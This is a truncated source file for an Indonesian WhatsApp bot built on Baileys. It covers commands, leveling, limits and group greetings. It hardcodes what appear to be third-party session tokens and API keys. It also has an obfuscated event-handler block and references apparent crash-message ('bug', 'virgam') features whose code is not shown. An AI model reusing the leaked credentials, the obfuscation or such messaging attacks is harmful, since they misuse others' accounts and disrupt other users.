//ZACKY BOT V10
//╔═╦═══• •✠•❀•✠ • •════╗
//║✧ུ║        「 INFO CREATOR」                     
//║✧ུ║ུNama : *Arya Manik*
//║✧ུ║ུNamaBot : *ManikBot*             
//║✧ུ║ུSC ORI : *MHANKBARBAR*             
//║✧ུ║ུTQTO : *ALL CREATOR BOT*             
//║✧ུ║ུTQTO : *PENYEDIA APIKEY DISINI*
//║✧ུ║ུYT : 「 ᴍᴀɴɪᴋ ᴏғғɪᴄɪᴀʟツ 」
//╚═╩═══• •✠•❀•✠ • •════╝
//                    StayHalalNoBully
//SC ORI BY MBB
//RECODE BY MANIK
//MAU RECODE? BOLE BROK KITA SAMA" COMOT":V
//TAPI JAN LUPA ISI NAMA KITA" Y :)
//GANTI TAMPILAN MENU DI SRC/HELP.JS ATAU SIMPEL.JS YA
//GANTI FAKE/APIKEY DI SRC/SETTING.JSON ATAU MAKE COMMAND YA
//DISINI APIKEY LOLHUMAN, VHTEAR, XTEAM, FREE YA, TAPI GADA DI manikganz.JS, KALO MAU GANTI PAKE COMMAND AJA YA:V
//MAKASIH BUAT YG UDA MAKE SC GW 
//BUTTON BY zakbotzv01
//BAILEYS @adiwajshing by NdaaBotz8 & LordUserbot
/* =================================================================================================================*/    
const {
   WAConnection,
   MessageType,
   Presence,
   MessageOptions,
   Mimetype,
   WALocationMessage,
   WA_MESSAGE_STUB_TYPES,
   ReconnectMode,
   ProxyAgent,
   ChatModification,
   GroupSettingChange,
   waChatKey,
   mentionedJid,
   processTime,
   processTicksAndRejections,
   ECONNABORTED,
   apikey,
   WA_DEAFULT_EPHEMERAL,
   DataView,
   TypedArray,
   prepareMessageFromContent, 
   relayWAMessage,
} = require('@adiwajshing/baileys')

/*[-- Require setting --]*/
const simple = require('./lib/simple.js')
const FormData = require('form-data')
const chalk = require('chalk')
const qrcode = require("qrcode-terminal")
const qrkode = require("qrcode")
const { color, bgcolor } = require('./lib/color')
const { help } = require('./src/help')
const { simpel, plem, stickerr, game, seting, owner, tod, islam, downlod, movie, searching, randomtxt, animanga, ingfo, entert, chnger, creat, primbon, stalk, texpro, potoxy, epoto, film, searc, randomtext, berita, detek, nsftw, anime, randomimg, soviet, storage, entah, basenc, asup, shortl, grupp, anti, edit, serti, nulis, sound, cmdd, bugg } = require('./src/simpel')
const { fetchJson, getBase64, createExif } = require('./lib/fetcher')
const { recognize } = require('./lib/ocr')
const fs = require('fs')
const crypto = require('crypto')
const brainly = require('brainly-scraper')
const toMs = require('ms')
const ms = require('parse-ms')
const moment = require('moment-timezone')
const { spawn, exec, execSync } = require('child_process')
const fetch = require('node-fetch')
const request = require('request')
const tiktod = require('tiktok-scraper')
const ffmpeg = require('fluent-ffmpeg')
const { removeBackgroundFromImageFile } = require('remove.bg')
const imageToBase64 = require('image-to-base64')
const yts = require( 'yt-search')
const util = require('util')
const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
const nsfw = JSON.parse(fs.readFileSync('./src/nsfw.json'))
const samih = JSON.parse(fs.readFileSync('./src/simi.json'))
const manikganz = JSON.parse(fs.readFileSync('./src/settings.json')) //GAUSAH DIGANTI NTAR EMROR NANGES!!
_registered = JSON.parse(fs.readFileSync('./database/bot/registered.json'))
const _leveling = JSON.parse(fs.readFileSync('./database/group/leveling.json'))
const bad = JSON.parse(fs.readFileSync('./database/group/bad.json'))
const badword = JSON.parse(fs.readFileSync('./database/group/badword.json'))
const event = JSON.parse(fs.readFileSync('./database/bot/event.json'))
const _limit = JSON.parse(fs.readFileSync('./database/user/limit.json'))
const uang = JSON.parse(fs.readFileSync('./database/user/uang.json'))
const _level = JSON.parse(fs.readFileSync('./database/user/level.json'))
const ban = JSON.parse(fs.readFileSync('./database/user/banned.json'))
const isBanned = JSON.parse(fs.readFileSync('./database/user/banned.json'))
const prem = JSON.parse(fs.readFileSync('./database/user/prem.json'))
const adm = JSON.parse(fs.readFileSync('./database/user/admin.json'))
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const off = require('./lib/afk.js')
let _off = JSON.parse(fs.readFileSync('./src/afk.json'))
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const { ind } = require('./ManikBot')
const tebakgambar = JSON.parse(fs.readFileSync('./database/tebakgambar.json'))
const antilink = JSON.parse(fs.readFileSync('./database/group/antilink.json'))
const antitelegram = JSON.parse(fs.readFileSync('./database/group/antitelegram.json'))
const antilinkig = JSON.parse(fs.readFileSync('./database/group/antilinkig.json'))
const antilinkfb = JSON.parse(fs.readFileSync('./database/group/antilinkfb.json'))
const antilinkytv = JSON.parse(fs.readFileSync('./database/group/antilinkyt.json'))
const antilinkytc = JSON.parse(fs.readFileSync('./database/group/antilinkytchannel.json'))
const antifirtex = JSON.parse(fs.readFileSync('./database/group/antifirtex.json'))
const premium = JSON.parse(fs.readFileSync('./database/user/prem.json'))
const rekap = JSON.parse(fs.readFileSync('./src/rekapvir.json'))
const setiker = JSON.parse(fs.readFileSync('./add/stik.json'))
const videonye = JSON.parse(fs.readFileSync('./add/video.json'))
const audionye = JSON.parse(fs.readFileSync('./add/audio.json'))
const imagenye = JSON.parse(fs.readFileSync('./add/image.json'))
const iron = JSON.parse(fs.readFileSync('./database/user/iron.json'))
const diamond = JSON.parse(fs.readFileSync('./database/user/diamond.json'))
const scommand = JSON.parse(fs.readFileSync('./database/scommand.json'))
const { addCommands, checkCommands, deleteCommands } = require('./lib/autoresp')
const commandsDB = JSON.parse(fs.readFileSync('./database/commands.json'))
const { y2mateA, y2mateV } = require('./lib/y2mate')
const { uploadimg, upload } = require('./lib/uploadimg')
let filter = JSON.parse(fs.readFileSync('./src/filter.json'))
const sfilter = JSON.parse(fs.readFileSync('./src/sfilter.json'))
virgam = fs.readFileSync('./media/virgam.jpeg')
const { jadibot, stopjadibot, listjadibot } = require('./lib/jadibot')
const { jadibut } = require('./src/jadibot')
const { mediafireDl } = require('./lib/mediafire.js')
const hx = require('hxz-api')
const { yta, ytv, buffer2Stream, ytsr, baseURI, stream2Buffer, noop } = require('./lib/ytdl')
const { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
const zacky = new WAConnection()
const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType			

/********** CREATOR **********/
var creatorList = ['Whatsapp Bot', 'Bot Wea', 'Creator Bot Indonesia', 'Zacky Bot']
var creator = creatorList[Math.floor(Math.random() * creatorList.length)];

/********** SET IMAGE **********/
imageh = fs.readFileSync('./lib/◇.jpeg')
imagoh = fs.readFileSync('./lib/🅁.jpg')

/********** SWITCH TRUE OR FALSE **********/
public = true
charging = false
readGc = true
readPc = false
autorecording = false
autoplaymusic = false
ketikgc = false
ketikpc = false
antitrol = true 
bugc = true
offline = false
ellol = false
autobio = false

/*[-- Apikey setting2 --]*/
lolkey = manikganz.lolkey
xteamkey = manikganz.xteamkey
vhkey = manikganz.vhkey
leyskey = manikganz.leyskey 
mbbkey = manikganz.mbbKey 
zekskey = manikganz.zekskey 
HunterApi = "Ikyy69"

/*[-- Load setting --]*/
prefix = manikganz.prefix    	        			
memberlimit = manikganz.memberlimit
limitawal = manikganz.limitawal
NamaBot = manikganz.namabot
NamaOwner = manikganz.NamaOwner
fakedoc = manikganz.fakedoc
fakereply = manikganz.fakereply
faketoko = manikganz.faketoko
fakegroup = manikganz.fakegroup
imgibb = manikganz.imgibb
TargetChat = manikganz.TargetChat

/*[-- ULTAH --]*/
kapan = "2022-03-12" //SET TANGGAL ULTAH KLEAN:V

/*[-- Blablabla --]*/
fake = `${NamaBot}`
battre = 'LOADING...',
Chargi = 'MENDETEKSI...',
btre = 'Sisa Energi: [BELOM DETECT]'
uwu = '```'
numbernye = 0
blocked = []
hitt = []

/********** FUNCTION **********/
const axios = require('axios')
const cfonts = require('cfonts')
const spin = require('spinnies')
const Crypto = require('crypto')

const wait = async (media) => new Promise(async (resolve, reject) => {
    const attachmentData = `data:image/jpeg;base64,${media.toString('base64')}`
    const response = await fetch("https://trace.moe/api/search",{method: "POST",body: JSON.stringify({ image: attachmentData }),headers: { "Content-Type": "application/json" }});
    if (!response.ok) reject(`Gambar tidak ditemukan!`);
    const result = await response.json()
    try {
    	const { is_adult, title, title_chinese, title_romaji, title_english, episode, season, similarity, filename, at, tokenthumb, anilist_id } = result.docs[0]
    	let belief = () => similarity < 0.89 ? "Saya memiliki keyakinan rendah dalam hal ini : " : ""
    	let ecch = () => is_adult ? "Iya" : "Tidak"
    	resolve({video: await getBuffer(`https://media.trace.moe/video/${anilist_id}/${encodeURIComponent(filename)}?t=${at}&token=${tokenthumb}`), teks: `${belief()}
~> Ecchi : *${ecch()}*
~> Judul Jepang : *${title}*
~> Ejaan Judul : *${title_romaji}*
~> Judul Inggris : *${title_english}*
~> Episode : *${episode}*
~> Season  : *${season}*`});
	} catch (err) {
		console.log(err)
		reject(`Saya tidak tau ini anime apa`)
	}
})

const simih = async (text) => {
	try {
		const sami = await fetch(`https://secureapp.simsimi.com/v1/simsimi/talkset?uid=297971048&av=6.9.3.4&lc=id&cc=ID&tz=Asia%2FJakarta&os=a&ak=quS%2FxiW%2Bb8ys5agzpljUdoPdLH8%3D&message_sentence=${text}&normalProb=8&isFilter=1&talkCnt=1&talkCntTotal=1&reqFilter=1&session=nSt8PSSmKRbcR7quUkfhXYpmDYgErtBefVbkkri9CrGSVjm4Cj2e2zBFjvdxSijp56WjyK6g2EWTj3KxKz65DL22&triggerKeywords=%5B%5D`, {method: 'GET'})
		const res = await sami.json()
		return res.simsimi_talk_set.answers[0].sentence
	} catch {
		return 'Simi ga tau kak'
	}
}

const h2k = (number) => {
    var SI_POSTFIXES = ["", " K", " M", " G", " T", " P", " E"]
    var tier = Math.log10(Math.abs(number)) / 3 | 0
    if(tier == 0) return number
    var postfix = SI_POSTFIXES[tier]
    var scale = Math.pow(10, tier * 3)
    var scaled = number / scale
    var formatted = scaled.toFixed(1) + ''
    if (/\.0$/.test(formatted))
      formatted = formatted.substr(0, formatted.length - 2)
    return formatted + postfix
}

const getBuffer = async (url, options) => {
	try {
		options ? options : {}
		const res = await axios({
			method: "get",
			url,
			headers: {
				'DNT': 1,
				'Upgrade-Insecure-Request': 1
			},
			...options,
			responseType: 'arraybuffer'
		})
		return res.data
	} catch (e) {
		console.log(`Error : ${e}`)
	}
}

const randomBytes = (length) => {
    return Crypto.randomBytes(length)
}

const generateMessageID = () => {
    return randomBytes(10).toString('hex').toUpperCase()
}

const getGroupAdmins = (participants) => {
	admins = []
	for (let i of participants) {
		i.isAdmin ? admins.push(i.jid) : ''
	}
	return admins
}

const getRandom = (ext) => {
	return `${Math.floor(Math.random() * 10000)}${ext}`
}

/********** REGISTER **********/
         const getRegisteredRandomId = () => {
            return _registered[Math.floor(Math.random() * _registered.length)].id
        }
        const addRegisteredUser = (userid, sender, age, time, serials) => {
            const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
            _registered.push(obj)
            fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
        }
        const createSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }
        const checkRegisteredUser = (sender) => {
            let status = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    status = true
                }
            })
            return status
        }
        
/********** FUNCTION LEVELING **********/
 getLevelingXp = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].xp
            }
        }
         getLevelingLevel = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].level
            }
        }
         getLevelingId = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].id
            }
        }
         addLevelingXp = (sender, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].xp += amount
                fs.writeFileSync('./database/user/level.json', JSON.stringify(_level))
            }
        }
         addLevelingLevel = (sender, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].level += amount
                fs.writeFileSync('./database/user/level.json', JSON.stringify(_level))
            }
        }
         addLevelingId = (sender) => {
            const obj = {id: sender, xp: 1, level: 1}
            _level.push(obj)
            fs.writeFileSync('./database/user/level.json', JSON.stringify(_level))
        }
         getLimit = (sender) => {
        	let position = false
              Object.keys(limit).forEach ((i) => {
              	if (limit[position].id === sender) {
              	   position = i
                  }
              })
             if (position !== false) {
                return limit[position].limit
            }
        }
        
        
/********** FUNCTION GAME IRON **********/
        const addIdIron = (sender) => {
        	const obj = {id: sender, iron : 0}
            iron.push(obj)
            fs.writeFileSync('./database/user/iron.json', JSON.stringify(iron))
        }
        const addIronUser = (sender, amount) => {
            let position = false
            Object.keys(iron).forEach((i) => {
                if (iron[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                iron[position].iron += amount
                fs.writeFileSync('./database/user/iron.json', JSON.stringify(iron))
            }
        }
        const checkIronUser = (sender) => {
        	let position = false
            Object.keys(iron).forEach((i) => {
                if (iron[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return iron[position].iron
            }
        }
        const ambilIron = (sender, amount) => {
        	let position = false
            Object.keys(iron).forEach((i) => {
                if (iron[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                irom[position].iron -= amount
                fs.writeFileSync('./database/user/iron.json', JSON.stringify(iron))
            }
        }
     
     /********** PREMIUM **********/
     const getPremiumExpired = (sender) => {
		    let position = null
		    Object.keys(prem).forEach((i) => {
		        if (prem[i].id === sender) {
		            position = i
		        }
		    })
		    if (position !== null) {
		        return prem[position].expired
		    }
		} 
		
		const expiredCheck = () => {
		    setInterval(() => {
		        let position = null
		        Object.keys(prem).forEach((i) => {
		            if (Date.now() >= prem[i].expired) {
		                position = i
		            }
		        })
		        if (position !== null) {
		            console.log(`Premium expired: ${prem[position].id}`)
		            prem.splice(position, 1)
		            fs.writeFileSync('./database/user/prem.json', JSON.stringify(prem))
		             }
		    }, 1000)
		} 
		
		const getAllPremiumUser = () => {
		    const array = []
		    Object.keys(prem).forEach((i) => {
		        array.push(prem[i].id)
		    })
		    return array
		}
		
/********** ATM **********/
        const addATM = (sender) => {
        	const obj = {id: sender, uang : 0}
            uang.push(obj)
            fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
        }
        const addKoinUser = (sender, amount) => {
            let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang += amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
        const checkATMuser = (sender) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return uang[position].uang
            }
        }
        const confirmATM = (sender, amount) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
        
/********** LIMIT **********/
        const bayarLimit = (sender, amount) => {
        	let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit -= amount
                fs.writeFileSync('./database/user/limit.json', JSON.stringify(_limit))
            }
        }
            const limitAdd = (sender) => {
             let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit += 1
                fs.writeFileSync('./database/user/limit.json', JSON.stringify(_limit))
            }
        }
        
/********** LIMIT **********/
const isLimit = (sender) =>{ 
		      let position = false
              for (let i of _limit) {
              if (i.id === sender) {
              	let limits = i.limit
              if (limits >= limitawal ) {
              	  position = true
                    zacky.sendMessage(from, ind.limitend(pushname), text, {quoted: mek})
                    return true
              } else {
              	_limit
                  position = true
                  return false
               }
             }
           }
           if (position === false) {
           	const obj = { id: sender, limit: 1 }
                _limit.push(obj)
                fs.writeFileSync('./database/user/limit.json',JSON.stringify(_limit))
           return false
       }
     }

/********** LIMIT **********/
          const checkLimit = (sender) => {
          	let found = false
                    for (let lmt of _limit) {
                        if (lmt.id === sender) {
                            let limitCounts = limitawal - lmt.limit
                            if (limitCounts <= 0) return zacky.sendMessage(from,`Limit request anda sudah habis\n\n_Note : Limit akan direset setiap jam 21:00!_`, text,{ quoted: mek})
                            zacky.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                            found = true
                        }
                    }
                    if (found === false) {
                        let obj = { id: sender, limit: 1 }
                        _limit.push(obj)
                        fs.writeFileSync('./database/user/limit.json', JSON.stringify(_limit))
                        zacky.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                    }
				}
				
// FUNTION CHAT \\
      getpc = async function(totalchat){
   let pc = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && !d.includes('g.us')){
         b.push(d)
      }
   }
   return b
}
const getName = async function(totalchat){
   let grup = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && d.includes('g.us')){
         b.push(d)
      }
   }
   for (e of b){
      let ingfo = await zacky.groupMetadata(from)
      grup.push(ingfo)
   }
   return grup
}

/********** CMD **********/
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    scommand.push(obj)
    fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return scommand[position].chats
    }
}
				  		  
/********** TIME **********/
function kyun(seconds){
  function pad(s){
    return (s < 10 ? '0' : '') + s;
  }
  var hours = Math.floor(seconds / (60*60));
  var minutes = Math.floor(seconds % (60*60) / 60);
  var seconds = Math.floor(seconds % 60);
  
  //return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
  return `${pad(hours)}:${pad(minutes)}:${pad(seconds)}`
}
function waktu(seconds) {
	seconds = Number(seconds);
	var d = Math.floor(seconds / (3600 * 24));
	var h = Math.floor(seconds % (3600 * 24) / 3600);
	var m = Math.floor(seconds % 3600 / 60);
	var s = Math.floor(seconds % 60);
	var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " days, ") : "";
	var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " hours, ") : "";
	var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " minutes, ") : "";
	var sDisplay = s > 0 ? s + (s == 1 ? " second" : " seconds") : "";
	return dDisplay + hDisplay + mDisplay + sDisplay;
}
/**HARI**/
var date = new Date();

var tahun = date.getFullYear();

var bulan = date.getMonth();
var tanggal = date.getDate();
var hari = date.getDay();
var jams = date.getHours();
var menit = date.getMinutes();
var detik = date.getSeconds();


switch(hari) {
 case 0: hari = "Minggu"; break;
 case 1: hari = "Senin"; break;
 case 2: hari = "Selasa"; break;
 case 3: hari = "Rabu"; break;
 case 4: hari = "Kamis"; break;
 case 5: hari = "Jum'at"; break;
 case 6: hari = "Sabtu"; break;
}
switch(bulan) {
 case 0: bulan = "Januari"; break;
 case 1: bulan = "Februari"; break;
 case 2: bulan = "Maret"; break;
 case 3: bulan = "April"; break;
 case 4: bulan = "Mei"; break;
 case 5: bulan = "Juni"; break;
 case 6: bulan = "Juli"; break;
 case 7: bulan = "Agustus"; break;
 case 8: bulan = "September"; break;
 case 9: bulan = "Oktober"; break;
 case 10: bulan = "November"; break;
 case 11: bulan = "Desember"; break;
}
            switch(jams){
                case 0: pada = "Malem"; break;
                case 1: pada = "Malem"; break;
                case 2: pada = "Malem"; break;
                case 3: pada = "Pagi"; break;
                case 4: pada = "Pagi"; break;
                case 5: pada = "Pagi"; break;
                case 6: pada = "Pagi"; break;
                case 7: pada = "Pagi"; break;
                case 8: pada = "Pagi"; break;
                case 9: pada = "Pagi"; break;
                case 10: pada = "Pagi"; break;
                case 11: pada = "Siang"; break;
                case 12: pada = "Siang"; break;
                case 13: pada = "Siang"; break;
                case 14: pada = "Siang"; break;
                case 15: pada = "Sore"; break;
                case 16: pada = "Sore"; break;
                case 17: pada = "Sore"; break;
                case 18: pada = "Malem"; break;
                case 19: pada = "Malem"; break;
                case 20: pada = "Malem"; break;
                case 21: pada = "Malem"; break;
                case 22: pada = "Malem"; break;
                case 23: pada = "Malem"; break;
            }
 tampilTanggal = tanggal + " " + bulan + " " + tahun;
 tampilWaktu =  jams + ":" + menit + ":" + detik; 
 tampilHari = pada;
 let d = new Date
 let locale = 'id'
 let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
 const wetod = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
 const week = d.toLocaleDateString(locale, { weekday: 'long' })
 weton = hari + " " + wetod				
    
/********** SET ACTION **********/
const _0x26a1=['&bg=','messages','blocklist','\x0a║┣❥\x20Group\x20:\x20','participants','subject','&pp=','B391837A58338BA8186C47E51FFDFD4A','Kntl','','Hai\x20Bang\x20Owner,\x20Battery\x20Sisa\x20','\x0a╔═══\x20❰\x20「\x20*PROMOTED*\x20」❱\x20════\x0a║\x20*@','Sisa\x20Energi:\x0a','127382sLKOOG','\x20SELAMAT🥳*\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a║┣❥\x20Nama\x20:\x20','66RmEAWW','contextInfo','pop','%[█████▒▒▒▒▒]','groupMetadata','push','%[█▒▒▒▒▒▒▒▒▒]','user','\x0a║┣❥\x20Pada\x20:\x20','getProfilePicture','CB:action,,battery','%[████▒▒▒▒▒▒]','Auto\x20block\x20system,\x20dont\x20call\x20please','sendMessage','%[████████▒▒]','text','&descriminator=','get','s.whatsapp.net','%[███▒▒▒▒▒▒▒]','%[███████▒▒▒]','_Welcome_','replace','remove','split','\x20intro*\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a║┣❥\x20Nama\x20:\x20\x0a║┣❥\x20Umur\x20:\x0a║┣❥\x20Askot\x20:\x0a║┣❥\x20Cewe/Cowo?\x0a║┣❥\x20Tanggal\x20:\x20','\x0a╔═══\x20❰\x20「\x20*DEMOTED*\x20」❱\x20════\x0a║\x20*@','222359oddCBh','\x0a║┣❥\x20Date\x20:\x20','3eOVUyH','3GlzsvE','fromMe','%[██████▒▒▒▒]','*\x20⸩\x20═════','@c.us','http://hadi-api.herokuapp.com/api/card/welcome?nama=','image','Energi\x20Penuh:\x0a','1TjEIsX','jid','unshift','CB:action,,call','PENDING','_events','CB:action,add:relay,message','316891UHtuhq','chats','key','participant','1614069378','application/octet-stream','%[█████████▒]','protocolMessage','717933mmarCb','message','log','relayWAMessage','remoteJid','extendedText','action','https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg','add','CB:Blocklist','1136713OohpCh','\x0a╔══\x20❰\x20「\x20*DELETE\x20DETECTED*\x20」❱\x20═══\x0a║\x20*@','2qPdZuM','%[██▒▒▒▒▒▒▒▒]','\x0a║┣❥\x20*Your\x20Welcome🥳*\x0a╚════\x20⸨\x20*','contacts','value','promote','keys','includes','length','\x20JIAHAHA*\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a║┣❥\x20Nama\x20:\x20','4LAwWWK','\x20HAPUS\x20APAAN?*\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a║┣❥\x20Pada\x20:\x20','68vEcNni','demote','100','21606fqrkCQ','Error\x20:\x20%s','&gcname=','dict','c.us','\x0a*Kalo\x20Balik\x20Bawain\x20Gorengan\x20Ya️*','PROMOTE'];const _0x2c68d7=_0x1950;(function(_0x2d6039,_0x28a19b){const _0x3ecd1b=_0x1950;while(!![]){try{const _0x204681=parseInt(_0x3ecd1b(0x1fa))*parseInt(_0x3ecd1b(0x213))+-parseInt(_0x3ecd1b(0x1cb))*parseInt(_0x3ecd1b(0x1da))+parseInt(_0x3ecd1b(0x1fd))*-parseInt(_0x3ecd1b(0x1f8))+-parseInt(_0x3ecd1b(0x1ee))*-parseInt(_0x3ecd1b(0x1c8))+parseInt(_0x3ecd1b(0x1ec))*parseInt(_0x3ecd1b(0x1d3))+parseInt(_0x3ecd1b(0x1e2))+parseInt(_0x3ecd1b(0x1ca))*-parseInt(_0x3ecd1b(0x211));if(_0x204681===_0x28a19b)break;else _0x2d6039['push'](_0x2d6039['shift']());}catch(_0x2f93ce){_0x2d6039['push'](_0x2d6039['shift']());}}}(_0x26a1,0xd7f81),zacky['on'](_0x2c68d7(0x20d),async _0x5e2bd1=>{const _0x7517b7=_0x2c68d7;if(!welkum[_0x7517b7(0x1f5)](_0x5e2bd1[_0x7517b7(0x1d4)]))return;try{mem=_0x5e2bd1[_0x7517b7(0x208)][0x0];try{var _0x47f2ab=await zacky[_0x7517b7(0x1b6)](_0x5e2bd1['participants'][0x0]['split']('@')[0x0]+_0x7517b7(0x1cf));}catch(_0x4ca682){var _0x47f2ab='https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60';}if(_0x5e2bd1[_0x7517b7(0x1e8)]==_0x7517b7(0x1ea)){let _0xc56c4e=await zacky['groupMetadata'](_0x5e2bd1[_0x7517b7(0x1d4)]);memeg=_0xc56c4e['participants'][_0x7517b7(0x1f6)],num=_0x5e2bd1[_0x7517b7(0x208)][0x0],anu_user=zacky['contacts'][mem],teks='\x0a╔═══\x20❰\x20「\x20*WELCOME*\x20」❱\x20════\x0a║\x20*@'+num[_0x7517b7(0x1c5)]('@')[0x0]+_0x7517b7(0x1c6)+tampilTanggal+'\x0a║┣❥\x20Jam\x20:\x20'+wita+_0x7517b7(0x1b5)+tampilHari+'\x0a╚════\x20⸨\x20*'+NamaBot+_0x7517b7(0x1ce);let _0x2cc59e=await getBuffer(_0x7517b7(0x1d0)+num[_0x7517b7(0x1c5)]('@')[0x0]+_0x7517b7(0x1bd)+memeg+'&memcount='+memeg+'&gcname='+encodeURI(_0xc56c4e[_0x7517b7(0x209)])+_0x7517b7(0x20a)+_0x47f2ab+'&bg='+imgibb);zacky[_0x7517b7(0x1ba)](_0xc56c4e['id'],_0x2cc59e,MessageType[_0x7517b7(0x1d1)],{'caption':teks,'contextInfo':{'mentionedJid':[num]}});}if(_0x5e2bd1[_0x7517b7(0x1e8)]==_0x7517b7(0x1c4)){let _0x5ec028=await zacky['groupMetadata'](_0x5e2bd1['jid']);num=_0x5e2bd1[_0x7517b7(0x208)][0x0],anu_user=zacky['contacts'][mem],memeg=_0x5ec028[_0x7517b7(0x208)][_0x7517b7(0x1f6)],out='*Babay*\x20@'+num[_0x7517b7(0x1c5)]('@')[0x0]+_0x7517b7(0x202);let _0x9835c=await getBuffer('http://hadi-api.herokuapp.com/api/card/goodbye?nama='+anu_user['notify']+_0x7517b7(0x1bd)+memeg+'&memcount='+memeg+_0x7517b7(0x1ff)+encodeURI(_0x5ec028[_0x7517b7(0x209)])+'&pp='+_0x47f2ab+_0x7517b7(0x204)+imgibb);zacky[_0x7517b7(0x1ba)](_0x5ec028['id'],_0x9835c,MessageType['image'],{'caption':out,'contextInfo':{'mentionedJid':[num]}});}else{if(_0x5e2bd1[_0x7517b7(0x1e8)]==_0x7517b7(0x1f3)){const _0x5f16c5=await zacky[_0x7517b7(0x217)](_0x5e2bd1[_0x7517b7(0x1d4)]);num=_0x5e2bd1['participants'][0x0],anu_user=zacky[_0x7517b7(0x1f1)][mem],memeg=_0x5f16c5[_0x7517b7(0x208)]['length'];try{ppimg=await zacky[_0x7517b7(0x1b6)](_0x5e2bd1['participants'][0x0][_0x7517b7(0x1c5)]('@')[0x0]+_0x7517b7(0x1cf));}catch{ppimg=_0x7517b7(0x1e9);}let _0x386767=await getBuffer(ppimg);teks=_0x7517b7(0x20f)+num['split']('@')[0x0]+_0x7517b7(0x212)+anu_user['notify']+_0x7517b7(0x1c9)+tampilTanggal+_0x7517b7(0x207)+_0x5f16c5['subject']+_0x7517b7(0x1f0)+NamaBot+'*\x20⸩\x20═════',zacky['sendMessage'](_0x5f16c5['id'],_0x386767,MessageType[_0x7517b7(0x1d1)],{'caption':teks,'contextInfo':{'mentionedJid':[num]},'quoted':{'key':{'participant':''+numbernye,'remoteJid':'Kntl','fromMe':![],'id':_0x7517b7(0x20b)},'message':{'documentMessage':{'jpegThumbnail':_0x386767,'mimetype':'application/octet-stream','title':_0x7517b7(0x203),'fileLength':'36','pageCount':0x0,'fileName':'_Welcome_'}},'messageTimestamp':_0x7517b7(0x1de),'status':_0x7517b7(0x1d7)}});}else{if(_0x5e2bd1[_0x7517b7(0x1e8)]==_0x7517b7(0x1fb)){let _0x3dbe30=await 